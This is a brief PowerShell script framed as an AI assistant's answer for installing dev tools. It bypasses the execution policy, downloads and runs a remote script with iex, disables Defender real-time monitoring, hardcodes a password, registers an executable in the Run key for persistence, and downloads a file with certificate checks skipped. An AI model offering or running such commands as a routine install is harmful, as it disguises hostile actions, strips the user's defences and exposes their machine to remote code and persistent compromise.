# "Install the dev tools" as pasted from an AI answer.
Set-ExecutionPolicy Bypass -Scope Process -Force
iex ((New-Object System.Net.WebClient).DownloadString('https://example.com/install.ps1'))

Set-MpPreference -DisableRealtimeMonitoring $true
$password = "Winter2026!"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "DevHelper" -Value "C:\Tools\helper.exe" | Out-Null
Invoke-WebRequest -Uri "https://example.com/tool.zip" -OutFile "$env:TEMP\tool.zip" -SkipCertificateCheck
